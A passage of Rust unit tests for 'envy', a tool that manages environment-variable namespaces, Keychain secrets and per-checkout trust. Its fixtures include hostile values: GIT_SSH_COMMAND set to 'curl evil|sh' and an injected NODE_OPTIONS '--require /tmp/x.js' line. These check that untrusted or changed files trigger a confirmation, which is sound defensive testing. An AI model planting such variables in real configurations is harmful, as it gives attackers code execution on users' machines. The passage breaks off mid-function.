        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1")
            .with_secret("key-1");
        activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        let kinds: Vec<&str> = prompt
            .asked()
            .iter()
            .map(|a| match a {
                Asked::Confirm(_) => "confirm",
                Asked::Secret(_) => "secret",
                Asked::Plain { .. } => "plain",
            })
            .collect();
        assert_eq!(kinds, ["confirm", "secret", "secret"]);
        // The confirmation lists which secrets will be asked for.
        let Asked::Confirm(text) = &prompt.asked()[0] else {
            unreachable!()
        };
        assert!(
            text.contains("secret TOKEN: you will be asked for it")
                && text.contains("secret API_KEY: you will be asked for it"),
            "{text}"
        );
        assert!(!text.starts_with("Note:"), "{text}");
    }

    #[test]
    fn declining_the_confirmation_changes_nothing() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(false)
            .with_secret("tok-1")
            .with_secret("key-1");
        let err = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("nothing was changed"), "{msg}");
        assert!(snap(&store).is_empty());
        assert!(!trusted(&cfg, PROJ));
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn declined_confirmation_prompts_for_no_secret() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(false)
            .with_secret("tok-1")
            .with_secret("key-1");
        assert!(
            activate_here(
                &ctx_for(&cfg, &store, &prompt),
                "dev",
                &ActiveState::default()
            )
            .is_err()
        );
        assert_eq!(prompt.asked().len(), 1);
        assert!(matches!(prompt.asked()[0], Asked::Confirm(_)));
        assert_eq!(prompt.remaining(), 2);
    }

    #[test]
    fn a_cancelled_secret_prompt_records_nothing() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        // Yes, one secret, then the prompter runs out on the second.
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1");
        let err = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("API_KEY") && msg.contains("nothing was changed"),
            "{msg}"
        );
        assert!(!msg.contains("tok-1"), "{msg}");
        assert!(snap(&store).is_empty());
        assert!(!trusted(&cfg, PROJ));
    }

    #[test]
    fn keychain_write_failure_records_no_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "API_KEY",
        };
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1")
            .with_secret("key-1");
        assert!(
            activate_here(
                &ctx_for(&cfg, &store, &prompt),
                "dev",
                &ActiveState::default()
            )
            .is_err()
        );
        assert!(snap(&store.inner).is_empty());
        assert!(!trusted(&cfg, PROJ));
    }

    #[test]
    fn trust_record_failure_rolls_back_the_new_secrets() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        // A regular file where the trust directory goes: recording fails.
        std::fs::create_dir_all(base.path().join("user")).unwrap();
        std::fs::write(base.path().join("user/trust"), "").unwrap();
        let store = MemoryStore::default();
        store
            .set(PKEY, "TOKEN", &Secret::new("old-tok".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("key-1");
        let err = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        assert!(!format!("{err:#}").contains("old-tok"), "{err:#}");
        assert_eq!(snap(&store), vec![entry(PKEY, "TOKEN", "old-tok")]);
    }

    #[test]
    fn changed_file_says_so() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), "dev", PROJ)
            .unwrap();
        let changed = format!("{PROJ}EVIL = \"1\"\n");
        std::fs::write(cfg.dir().join("dev.toml"), &changed).unwrap();
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        assert!(
            activate_here(
                &ctx_for(&cfg, &store, &prompt),
                "dev",
                &ActiveState::default()
            )
            .is_err()
        );
        let Asked::Confirm(text) = &prompt.asked()[0] else {
            panic!("{:?}", prompt.asked())
        };
        assert!(text.starts_with(CHANGED_NOTE), "{text}");
        assert!(text.contains("EVIL"), "{text}");
        // The old record still stands; the changed text is not trusted.
        assert!(trusted(&cfg, PROJ) && !trusted(&cfg, &changed));
    }

    #[test]
    fn trusted_namespace_prompts_only_for_missing_secrets() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), "dev", PROJ)
            .unwrap();
        let store = MemoryStore::default();
        store
            .set(PKEY, "TOKEN", &Secret::new("tok-0".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_secret("key-1");
        let out = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        assert!(
            out.ends_with("export TOKEN='tok-0'\nexport API_KEY='key-1'\n"),
            "{out}"
        );
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret(project_label("API_KEY"))]
        );
        assert!(trusted(&cfg, PROJ));
    }

    #[test]
    fn trust_is_bound_to_the_checkout_path() {
        let base = tempfile::tempdir().unwrap();
        let a = checkout(base.path(), "a", PROJ);
        let b = checkout(base.path(), "b", PROJ);
        let store = MemoryStore::default();
        let first = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1")
            .with_secret("key-1");
        activate_here(&ctx_for(&a, &store, &first), "dev", &ActiveState::default()).unwrap();
        assert!(trusted(&a, PROJ) && !trusted(&b, PROJ));
        // Same text, same identity, other checkout: asked again; a no leaves
        // checkout b untrusted and the shared secrets alone.
        let declined = ScriptedPrompter::new().with_confirm(false);
        assert!(
            activate_here(
                &ctx_for(&b, &store, &declined),
                "dev",
                &ActiveState::default()
            )
            .is_err()
        );
        assert!(matches!(declined.asked()[..], [Asked::Confirm(_)]));
        assert!(!trusted(&b, PROJ));
        assert_eq!(snap(&store).len(), 2);
    }

    #[test]
    fn second_checkout_asks_again_but_shared_secrets_are_not_reasked() {
        let base = tempfile::tempdir().unwrap();
        let a = checkout(base.path(), "a", PROJ);
        let b = checkout(base.path(), "b", PROJ);
        let store = MemoryStore::default();
        let first = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1")
            .with_secret("key-1");
        let out_a =
            activate_here(&ctx_for(&a, &store, &first), "dev", &ActiveState::default()).unwrap();
        let second = ScriptedPrompter::new().with_confirm(true);
        let out_b = activate_here(
            &ctx_for(&b, &store, &second),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        // The same values, each recording its own checkout as the source.
        assert_eq!(
            out_a.replace(&encode_path(a.dir()), "<checkout>"),
            out_b.replace(&encode_path(b.dir()), "<checkout>")
        );
        assert!(out_b.contains(&format!("\u{1f}{}\u{1f}", encode_path(b.dir()))));
        let asked = second.asked();
        assert_eq!(asked.len(), 1, "{asked:?}");
        let Asked::Confirm(text) = &asked[0] else {
            panic!("{asked:?}")
        };
        assert!(
            text.contains("secret TOKEN: already in your Keychain")
                && text.contains("secret API_KEY: already in your Keychain"),
            "{text}"
        );
        assert!(!text.starts_with("Note:"), "{text}");
        assert!(trusted(&b, PROJ));
    }

    #[test]
    fn drifted_group_is_refused_before_any_prompt() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(
            base.path(),
            "a",
            "link = \"aws\"\n\n[vars]\nTOKEN = \"@keychain\"\n",
        );
        std::fs::write(
            cfg.dir().join("other.toml"),
            "link = \"aws\"\n\n[vars]\nREGION = \"us\"\n",
        )
        .unwrap();
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1");
        let err = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        assert!(format!("{err:#}").contains("missing REGION"), "{err:#}");
        assert!(prompt.asked().is_empty());
        assert!(snap(&store).is_empty());
        assert!(!base.path().join("user/trust").exists());
    }

    #[test]
    fn confirmation_contains_no_secret_value() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        store
            .set(PKEY, "TOKEN", &Secret::new("zq-stored-secret".into()))
            .unwrap();
        // Declined, then accepted with the secret prompt failing.
        let declined = ScriptedPrompter::new().with_confirm(false);
        let err1 = activate_here(
            &ctx_for(&cfg, &store, &declined),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        let failed = ScriptedPrompter::new().with_confirm(true);
        let err2 = activate_here(
            &ctx_for(&cfg, &store, &failed),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        let seen = format!(
            "{:?} {:?} {err1:#} {err1:?} {err2:#} {err2:?}",
            declined.asked(),
            failed.asked()
        );
        assert!(
            seen.contains("secret TOKEN: already in your Keychain"),
            "{seen}"
        );
        assert!(!seen.contains("zq-stored-secret"), "{seen}");
        assert_eq!(snap(&store), vec![entry(PKEY, "TOKEN", "zq-stored-secret")]);
    }

    #[test]
    fn user_level_missing_secret_is_prompted() {
        let (_dir, cfg) = config_with(&[("work", "[vars]\nA = \"x\"\nB = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("b-1");
        let out = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &ActiveState::default(),
        )
        .unwrap();
        assert!(out.ends_with("export A='x'\nexport B='b-1'\n"), "{out}");
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret(secret_label("B", "work"))]
        );
        assert_eq!(snap(&store), vec![entry("work", "B", "b-1")]);
    }

    #[test]
    fn user_level_never_confirms() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"x\"\nB = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store.set("work", "B", &Secret::new("b-0".into())).unwrap();
        let prompt = ScriptedPrompter::new();
        activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &ActiveState::default(),
        )
        .unwrap();
        assert!(prompt.asked().is_empty());
        assert!(!dir.path().join("trust").exists());
    }

    #[test]
    fn no_terminal_is_an_error() {
        // An untrusted project namespace.
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        let err = activate_here(
            &ctx_for(&cfg, &store, &NoTerminal),
            "dev",
            &ActiveState::default(),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("needs a terminal") && msg.contains("nothing was changed"),
            "{msg}"
        );
        assert!(snap(&store).is_empty());
        assert!(!trusted(&cfg, PROJ));
        // A missing secret at user level.
        let (_dir, user) = config_with(&[("work", "[vars]\nB = \"@keychain\"\n")]);
        let err = activate_here(
            &ctx_for(&user, &store, &NoTerminal),
            "work",
            &ActiveState::default(),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("B") && msg.contains("terminal") && msg.contains("nothing was changed"),
            "{msg}"
        );
        assert!(snap(&store).is_empty());
    }

    // ---- project-level create and remove ----

    fn ctx_of<'a>(
        cfg: &'a Config,
        store: &'a MemoryStore,
        prompt: &'a ScriptedPrompter,
    ) -> Ctx<'a> {
        Ctx { cfg, store, prompt }
    }

    fn mode(path: &Path) -> u32 {
        std::fs::metadata(path).unwrap().permissions().mode() & 0o7777
    }

    #[test]
    fn create_in_a_project_level_writes_a_shared_file_and_records_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = project_cfg(base.path(), "acme/api");
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        create(&ctx_of(&cfg, &store, &prompt), "dev", None, None).unwrap();
        assert_eq!(
            std::fs::read_to_string(base.path().join(".envy/dev.toml")).unwrap(),
            ""
        );
        assert!(store.snapshot().is_empty());
        assert!(trusted(&cfg, ""));
        // The saved file reloads to exactly the text that was recorded.
        assert_eq!(
            cfg.load("dev").unwrap().text(),
            NamespaceFile::empty("dev").unwrap().text()
        );
        // Loading it needs no confirmation.
        let quiet = ScriptedPrompter::new();
        activate_here(
            &ctx_of(&cfg, &store, &quiet),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        assert!(quiet.asked().is_empty());
    }

    #[test]
    fn create_into_a_missing_envy_directory_uses_shared_permissions() {
        let base = tempfile::tempdir().unwrap();
        let cfg = project_cfg(base.path(), "acme/api");
        assert!(!base.path().join(".envy").exists());
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        create(&ctx_of(&cfg, &store, &prompt), "dev", None, None).unwrap();
        let dir_mode = mode(&base.path().join(".envy"));
        assert!(
            dir_mode & 0o700 == 0o700 && dir_mode & !0o755 == 0,
            "{dir_mode:o}"
        );
        let file_mode = mode(&base.path().join(".envy/dev.toml"));
        assert!(
            file_mode & 0o600 == 0o600 && file_mode & !0o644 == 0,
            "{file_mode:o}"
        );
    }

    #[test]
    fn create_with_like_copies_from_a_resolved_source_in_another_level() {
        let base = tempfile::tempdir().unwrap();
        let user = Config::new(base.path().join("user-ns"));
        std::fs::create_dir_all(user.dir()).unwrap();
        std::fs::write(user.dir().join("dev.toml"), SOURCE).unwrap();
        let cfg = project_cfg(base.path(), "acme/api");
        let store = MemoryStore::default();
        store
            .set("dev", "TOKEN", &Secret::new("user-token".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_secret("proj-token");
        let source = user.load("dev").unwrap();
        create(
            &ctx_of(&cfg, &store, &prompt),
            "dev",
            Some((&user, &source)),
            None,
        )
        .unwrap();
        let text = std::fs::read_to_string(base.path().join(".envy/dev.toml")).unwrap();
        assert_eq!(
            text,
            "[vars]\nAWS_REGION = \"eu-west-1\"\nTOKEN = \"@keychain\"\n"
        );
        assert_eq!(
            store.snapshot(),
            vec![
                entry("dev", "TOKEN", "user-token"),
                entry(PKEY, "TOKEN", "proj-token")
            ]
        );
        assert_eq!(
            std::fs::read_to_string(user.dir().join("dev.toml")).unwrap(),
            SOURCE
        );
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret(secret_label(
                "TOKEN",
                "dev (project acme/api)"
            ))]
        );
        assert!(trusted(&cfg, &text));
    }

    const RM: &str = "[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\nAPI_KEY = \"@keychain\"\n";

    fn rm_store() -> MemoryStore {
        let store = MemoryStore::default();
        for (ns, name, v) in [
            (PKEY, "TOKEN", "t"),
            (PKEY, "API_KEY", "k"),
            ("project/other/repo/dev", "TOKEN", "o"),
            ("dev", "TOKEN", "u"),
        ] {
            store.set(ns, name, &Secret::new(v.into())).unwrap();
        }
        store
    }

    #[test]
    fn remove_project_namespace_keeps_shared_secrets_by_default() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = rm_store();
        let before = store.snapshot();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(false);
        let kept = remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        assert_eq!(kept, vec!["TOKEN", "API_KEY"]);
        assert!(!cfg.exists("dev").unwrap());
        assert_eq!(store.snapshot(), before);
        assert_eq!(prompt.asked().len(), 2);
        assert_eq!(prompt.remaining(), 0);
    }

    #[test]
    fn remove_project_namespace_can_delete_the_projects_items() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = rm_store();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        let kept = remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        assert!(kept.is_empty(), "{kept:?}");
        assert!(!cfg.exists("dev").unwrap());
        assert_eq!(
            store.snapshot(),
            vec![
                entry("dev", "TOKEN", "u"),
                entry("project/other/repo/dev", "TOKEN", "o"),
            ]
        );
    }

    #[test]
    fn remove_project_declined_changes_nothing() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = rm_store();
        let before = store.snapshot();
        let prompt = ScriptedPrompter::new()
            .with_confirm(false)
            .with_confirm(true);
        assert!(remove(&ctx_of(&cfg, &store, &prompt), "dev").is_err());
        assert_eq!(
            std::fs::read_to_string(base.path().join("a/.envy/dev.toml")).unwrap(),
            RM
        );
        assert_eq!(store.snapshot(), before);
        assert_eq!(prompt.asked().len(), 1);
    }

    #[test]
    fn remove_project_namespace_without_secrets_asks_one_question() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", "[vars]\nREGION = \"eu\"\n");
        let store = rm_store();
        let before = store.snapshot();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let kept = remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        assert!(kept.is_empty(), "{kept:?}");
        assert!(!cfg.exists("dev").unwrap());
        assert_eq!(store.snapshot(), before);
        assert_eq!(prompt.asked().len(), 1);
    }

    #[test]
    fn remove_user_namespace_is_unchanged() {
        let (dir, cfg) = config_with(&[("dev", RM)]);
        let store = rm_store();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let kept = remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        assert!(kept.is_empty(), "{kept:?}");
        assert!(file_names(&dir).is_empty());
        assert_eq!(
            store.snapshot(),
            vec![
                entry(PKEY, "API_KEY", "k"),
                entry(PKEY, "TOKEN", "t"),
                entry("project/other/repo/dev", "TOKEN", "o"),
            ]
        );
        let asked = prompt.asked();
        assert_eq!(asked.len(), 1);
        assert!(matches!(&asked[0], Asked::Confirm(t) if t.contains("TOKEN, API_KEY")));
    }

    #[test]
    fn remove_project_namespace_needs_no_trust() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        assert!(!trusted(&cfg, RM));
        let store = rm_store();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(false);
        remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        assert!(!cfg.exists("dev").unwrap());
        for a in prompt.asked() {
            let Asked::Confirm(t) = a else { panic!() };
            assert!(!t.contains("trust"), "{t}");
        }
    }

    #[test]
    fn remove_project_without_a_terminal_says_nothing_was_changed() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = rm_store();
        let before = store.snapshot();
        let err = remove(
            &Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &NoTerminal,
            },
            "dev",
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("terminal") && msg.contains("nothing was changed"),
            "{msg}"
        );
        // The second question failing (no answer left) changes nothing either.
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let err = remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap_err();
        assert!(
            format!("{err:#}").contains("nothing was changed"),
            "{err:#}"
        );
        assert_eq!(
            std::fs::read_to_string(base.path().join("a/.envy/dev.toml")).unwrap(),
            RM
        );
        assert_eq!(store.snapshot(), before);
    }

    #[test]
    fn remove_texts_name_secrets_and_mention_sharing() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = MemoryStore::default();
        for (n, v) in [("TOKEN", "tok-value-1"), ("API_KEY", "key-value-2")] {
            store.set(PKEY, n, &Secret::new(v.into())).unwrap();
        }
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(false);
        remove(&ctx_of(&cfg, &store, &prompt), "dev").unwrap();
        let asked = prompt.asked();
        let (Asked::Confirm(q1), Asked::Confirm(q2)) = (&asked[0], &asked[1]) else {
            panic!()
        };
        assert!(q1.contains("\"dev\""), "{q1}");
        assert!(q2.contains("TOKEN") && q2.contains("API_KEY"), "{q2}");
        assert!(
            q2.contains("shared") && q2.contains("checkout") && q2.contains("fork"),
            "{q2}"
        );
        for q in [q1, q2] {
            for v in ["\"eu\"", "tok-value-1", "key-value-2"] {
                assert!(!q.contains(v), "{q}");
            }
        }
    }

    // ---- fix round 1: copying from an unconfirmed source, errors, labels ----

    const SRC: &str = "[vars]\nGIT_SSH_COMMAND = \"curl evil|sh\"\nTOKEN = \"@keychain\"\n";
    const COPY_END: &str = "Allow envy to copy these names and plain values into a new namespace";

    fn trusted_ns(cfg: &Config, ns: &str, text: &str) -> bool {
        crate::trust::TrustStore::new(cfg.user_dir())
            .is_trusted(cfg.root().unwrap(), ns, text)
            .unwrap()
    }

    /// An untrusted project source `dev` in checkout `a`, and a target config.
    fn copy_setup(user_target: bool) -> (tempfile::TempDir, Config, Config) {
        let base = tempfile::tempdir().unwrap();
        let source = checkout(base.path(), "a", SRC);
        let target = if user_target {
            Config::new(base.path().join("u"))
        } else {
            project_cfg(&base.path().join("b"), "acme/api")
        };
        (base, source, target)
    }

    fn copy_declined_and_accepted(user_target: bool) {
        let (_base, source, target) = copy_setup(user_target);
        let src_file = source.load("dev").unwrap();
        let store = MemoryStore::default();
        // Declined: nothing asked after the confirmation, nothing written.
        let no = ScriptedPrompter::new().with_confirm(false).with_secret("x");
        let err = create(
            &ctx_of(&target, &store, &no),
            "new",
            Some((&source, &src_file)),
            None,
        )
        .unwrap_err();
        assert_eq!(
            err.to_string(),
            "not copied: you did not trust namespace \"dev\"; nothing was copied"
        );
        assert!(!target.present("new").unwrap());
        assert!(store.snapshot().is_empty());
        assert_eq!(no.asked().len(), 1);
        assert_eq!(no.remaining(), 1);
        let Asked::Confirm(text) = &no.asked()[0] else {
            panic!()
        };
        assert!(
            text.contains("GIT_SSH_COMMAND") && text.ends_with(COPY_END),
            "{text}"
        );
        assert!(!trusted_ns(&source, "dev", SRC));
        if !user_target {
            assert!(!target.user_dir().join("trust").exists());
        }
        // Accepted: created; the source is still not trusted.
        let yes = ScriptedPrompter::new().with_confirm(true).with_secret("x");
        create(
            &ctx_of(&target, &store, &yes),
            "new",
            Some((&source, &src_file)),
            None,
        )
        .unwrap();
        assert!(target.exists("new").unwrap());
        assert!(!trusted_ns(&source, "dev", SRC));
        if !user_target {
            assert!(trusted_ns(
                &target,
                "new",
                &target.load("new").unwrap().text()
            ));
        }
        assert!(matches!(&yes.asked()[0], Asked::Confirm(_)));
        assert_eq!(yes.asked().len(), 2);
    }

    #[test]
    fn copying_an_unconfirmed_project_source_into_a_project_asks_first() {
        copy_declined_and_accepted(false);
    }

    #[test]
    fn copying_an_unconfirmed_project_source_into_user_level_asks_first() {
        copy_declined_and_accepted(true);
    }

    #[test]
    fn copying_a_trusted_project_source_asks_nothing_extra() {
        let (_base, source, target) = copy_setup(false);
        let src_file = source.load("dev").unwrap();
        record_trust(
            &ctx_of(&source, &MemoryStore::default(), &ScriptedPrompter::new()),
            &src_file,
        )
        .unwrap();
        let store = MemoryStore::default();
        let p = ScriptedPrompter::new().with_secret("x");
        create(
            &ctx_of(&target, &store, &p),
            "new",
            Some((&source, &src_file)),
            None,
        )
        .unwrap();
        assert_eq!(p.asked().len(), 1);
        assert!(matches!(&p.asked()[0], Asked::Secret(_)));
    }

    #[test]
    fn copying_from_a_user_level_source_asks_no_confirmation() {
        let (_base, source, target) = copy_setup(false);
        let user = Config::new(_base.path().join("u"));
        std::fs::create_dir_all(user.dir()).unwrap();
        std::fs::write(user.dir().join("dev.toml"), SRC).unwrap();
        let src_file = user.load("dev").unwrap();
        let store = MemoryStore::default();
        let p = ScriptedPrompter::new().with_secret("x");
        create(
            &ctx_of(&target, &store, &p),
            "new",
            Some((&user, &src_file)),
            None,
        )
        .unwrap();
        assert!(p.asked().iter().all(|a| matches!(a, Asked::Secret(_))));
        let _ = source;
    }

    #[test]
    fn copying_an_unconfirmed_source_without_a_terminal_fails_and_creates_nothing() {
        let (_base, source, target) = copy_setup(false);
        let src_file = source.load("dev").unwrap();
        let store = MemoryStore::default();
        let p = ScriptedPrompter::new();
        assert!(
            create(
                &ctx_of(&target, &store, &p),
                "new",
                Some((&source, &src_file)),
                None
            )
            .is_err()
        );
        assert!(!target.present("new").unwrap());
        assert!(store.snapshot().is_empty());
    }

    #[test]
    fn project_create_labels_name_the_project() {
        let base = tempfile::tempdir().unwrap();
        let cfg = project_cfg(base.path(), "acme/api");
        std::fs::create_dir_all(cfg.dir()).unwrap();
        std::fs::write(
            cfg.dir().join("m.toml"),
            "link = \"aws\"\n[vars]\nX = \"1\"\nS = \"@keychain\"\n",
        )
        .unwrap();
        let store = MemoryStore::default();
        let p = ScriptedPrompter::new().with_plain("v").with_secret("s");
        create(&ctx_of(&cfg, &store, &p), "n", None, Some("aws")).unwrap();
        let label = "n (project acme/api)";
        let asked = p.asked();
        assert!(
            asked.contains(&Asked::Secret(secret_label("S", label))),
            "{asked:?}"
        );
        assert!(
            asked.iter().any(
                |a| matches!(a, Asked::Plain { label: l, .. } if *l == plain_label("X", label))
            ),
            "{asked:?}"
        );
    }

    /// A store whose `delete` fails for one variable name.
    struct FailingDelete<'a> {
        inner: &'a MemoryStore,
        fail_on: &'static str,
    }

    impl SecretStore for FailingDelete<'_> {
        fn get(&self, ns: &str, name: &str) -> Result<Option<Secret>> {
            self.inner.get(ns, name)
        }
        fn contains(&self, ns: &str, name: &str) -> Result<bool> {
            self.inner.contains(ns, name)
        }
        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
            self.inner.set(ns, name, value)
        }
        fn delete(&self, ns: &str, name: &str) -> Result<()> {
            if name == self.fail_on {
                bail!("simulated Keychain failure");
            }
            self.inner.delete(ns, name)
        }
    }

    #[test]
    fn remove_project_store_failure_keeps_the_file_and_can_be_rerun() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let inner = rm_store();
        let failing = FailingDelete {
            inner: &inner,
            fail_on: "API_KEY",
        };
        let p = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &failing,
            prompt: &p,
        };
        let err = format!("{:#}", remove(&ctx, "dev").unwrap_err());
        assert!(
            err.contains("API_KEY") && err.contains("kept") && err.contains("again"),
            "{err}"
        );
        assert!(cfg.exists("dev").unwrap());
        let p2 = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        remove(&ctx_of(&cfg, &inner, &p2), "dev").unwrap();
        assert!(!cfg.exists("dev").unwrap());
        assert_eq!(
            inner.snapshot(),
            vec![
                entry("dev", "TOKEN", "u"),
                entry("project/other/repo/dev", "TOKEN", "o"),
            ]
        );
    }

    #[test]
    fn remove_project_with_only_some_secrets_in_the_keychain() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", RM);
        let store = MemoryStore::default();
        store
            .set(PKEY, "API_KEY", &Secret::new("k".into()))
            .unwrap();
        store.set("dev", "TOKEN", &Secret::new("u".into())).unwrap();
        let p = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        remove(&ctx_of(&cfg, &store, &p), "dev").unwrap();
        assert!(!cfg.exists("dev").unwrap());
        assert_eq!(store.snapshot(), vec![entry("dev", "TOKEN", "u")]);
    }

    // ---- changing a project namespace: trust first, then record the result ----

    const CHANGE_END: &str = "\n\nAllow envy to change this namespace, and trust the result";
    const HOSTILE: &str = "NODE_OPTIONS = \"--require /tmp/x.js\"\n";
    const T0: &str = "[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\n";
    const LINKED_T0: &str = "link = \"aws\"\n[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\n";

    /// Everything a command could change: every file under the checkout and
    /// the user dir (namespace files and trust records), with their contents.
    fn disk(base: &Path) -> Vec<(String, String)> {
        fn walk(dir: &Path, base: &Path, out: &mut Vec<(String, String)>) {
            let Ok(entries) = std::fs::read_dir(dir) else {
                return;
            };
            for e in entries {
                let path = e.unwrap().path();
                if path.is_dir() {
                    walk(&path, base, out);
                } else {
                    out.push((
                        path.strip_prefix(base).unwrap().display().to_string(),
                        std::fs::read_to_string(&path).unwrap(),
                    ));
                }
            }
        }
        let mut out = Vec::new();
        walk(base, base, &mut out);
        out.sort();
        out
    }

    /// Checkout `a` whose `dev` was trusted as `t0`, then changed on disk by a
    /// pull that slipped in a hostile line. TOKEN is in the Keychain.
    fn pulled(base: &Path, t0: &str) -> (Config, MemoryStore) {
        let cfg = checkout(base, "a", t0);
        crate::trust::TrustStore::new(cfg.user_dir())
            .record(cfg.root().unwrap(), "dev", t0)
            .unwrap();
        std::fs::write(cfg.dir().join("dev.toml"), format!("{t0}{HOSTILE}")).unwrap();
        let store = MemoryStore::default();
        store.set(PKEY, "TOKEN", &Secret::new("t".into())).unwrap();
        (cfg, store)
    }

    /// The first prompt is the Change confirmation for the pulled file.
    fn assert_change_confirmation_first(prompt: &ScriptedPrompter, changed: bool) {
        let asked = prompt.asked();
        let Some(Asked::Confirm(text)) = asked.first() else {
            panic!("first prompt is not the confirmation: {asked:?}")
        };
        assert_eq!(text.starts_with(CHANGED_NOTE), changed, "{text}");
        assert!(text.ends_with(CHANGE_END), "{text}");
        assert!(
            text.contains("Project namespace \"dev\" from acme/api"),
            "{text}"
        );
        if changed {
            assert!(
                text.contains("NODE_OPTIONS") && text.contains("\"--require /tmp/x.js\""),
                "{text}"
            );
        }
    }

    /// Loading `dev` now needs no question at all.
    fn activates_quietly(cfg: &Config, store: &MemoryStore) {
        let quiet = ScriptedPrompter::new();
